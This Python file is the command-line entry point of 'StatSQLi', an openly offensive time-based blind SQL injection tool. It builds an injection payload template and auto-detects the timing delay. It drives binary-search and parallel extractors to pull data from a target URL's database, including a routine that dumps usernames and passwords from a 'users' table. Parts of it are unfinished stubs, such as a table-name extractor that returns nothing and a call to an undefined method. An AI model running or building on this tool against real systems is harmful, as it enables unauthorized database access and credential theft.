"""
Main StatSQLi tool entry point.
Provides command-line interface and orchestrates extraction.
"""

import argparse
import sys
from typing import Optional, List, Dict
from .extractor import BinarySearchExtractor
from .adaptive import AdaptiveDelayDetector
from .parallel import ParallelExtractor
from .stats import TimingAnalyzer


class StatSQLi:
    """Main StatSQLi tool class."""
    
    def __init__(self, url: str, payload_template: Optional[str] = None,
                 delay: Optional[float] = None, parallel: bool = False,
                 max_workers: int = 4):
        """
        Initialize StatSQLi.
        
        Args:
            url: Vulnerable URL endpoint
            payload_template: SQL injection payload template (auto-generated if None)
            delay: SQL delay in seconds (auto-detected if None)
            parallel: Enable parallel extraction
            max_workers: Maximum parallel workers
        """
        self.url = url
        self.parallel = parallel
        
        # Generate payload template if not provided
        if payload_template is None:
            # Default MySQL time-based payload
            payload_template = "' OR ({condition}) -- -"
        
        self.payload_template = payload_template
        
        # Detect optimal delay if not provided
        if delay is None:
            print("[*] Detecting optimal delay...")
            detector = AdaptiveDelayDetector(url, payload_template)
            delay = detector.detect_optimal_delay()
        
        print(f"[+] Using delay: {delay}s")
        
        # Initialize components
        self.analyzer = TimingAnalyzer()
        self.extractor = BinarySearchExtractor(
            url, payload_template, delay, self.analyzer
        )
        
        if parallel:
            self.parallel_extractor = ParallelExtractor(self.extractor, max_workers)
        else:
            self.parallel_extractor = None
    
    def extract_database_name(self) -> str:
        """Extract current database name."""
        print("[*] Extracting database name...")
        return self.extract_string_custom(
            table="information_schema.schemata",
            column="schema_name",
            where_clause=f"schema_name='{self.get_current_database()}'" if hasattr(self, '_current_db') else "1=1 LIMIT 1"
        )
    
    def extract_table_names(self, database: str) -> List[str]:
        """Extract table names from a database."""
        print(f"[*] Extracting table names from database '{database}'...")
        # This would require iterative extraction - simplified for now
        tables = []
        # In real implementation, would query information_schema.tables
        return tables
    
    def extract_string_custom(self, table: str, column: str, 
                             where_clause: str = "1=1",
                             max_length: int = 100) -> str:
        """Extract a string with custom parameters."""
        if self.parallel and self.parallel_extractor:
            return self.parallel_extractor.extract_string_chunks(
                table, column, where_clause, max_length=max_length
            )
        else:
            return self.extractor.extract_string(
                table, column, where_clause, max_length
            )
    
    def extract_user_data(self, table: str = "users", 
                          username_column: str = "username",
                          password_column: str = "password",
                          limit: int = 5) -> List[Dict[str, str]]:
        """Extract user data from a table."""
        users = []
        
        for i in range(limit):
            print(f"\n[*] Extracting user {i+1}...")
            where = f"1=1 LIMIT {i},1"
            
            username = self.extract_string_custom(
                table, username_column, where, max_length=50
            )
            
            if not username:
                break
            
            password = self.extract_string_custom(
                table, password_column, where, max_length=100
            )
            
            users.append({
                'username': username,
                'password': password
            })
            
            print(f"[+] Extracted: {username}:{password}")
        
        return users


def main():
    """Main entry point for CLI."""
    parser = argparse.ArgumentParser(
        description='StatSQLi - Statistical Time-Based Blind SQL Injection Tool'
    )
    
    parser.add_argument('url', help='Target URL with vulnerable parameter')
    parser.add_argument('--payload', '-p', help='SQL injection payload template with {condition} placeholder')
    parser.add_argument('--delay', '-d', type=float, help='SQL delay in seconds (auto-detected if not specified)')
    parser.add_argument('--table', '-t', default='users', help='Table name to extract from')
    parser.add_argument('--column', '-c', default='username', help='Column name to extract')
    parser.add_argument('--where', '-w', default='1=1', help='WHERE clause for extraction')
    parser.add_argument('--parallel', action='store_true', help='Enable parallel extraction')
    parser.add_argument('--workers', type=int, default=4, help='Number of parallel workers')
    parser.add_argument('--max-length', type=int, default=100, help='Maximum string length')
    
    args = parser.parse_args()
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║         StatSQLi - Statistical SQL Injection Tool        ║
    ║                  Fast & Reliable Extraction               ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    try:
        tool = StatSQLi(
            args.url,
            args.payload,
            args.delay,
            args.parallel,
            args.workers
        )
        
        result = tool.extract_string_custom(
            args.table,
            args.column,
            args.where,
            args.max_length
        )
        
        print(f"\n[+] Extraction complete!")
        print(f"[+] Result: {result}")
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()

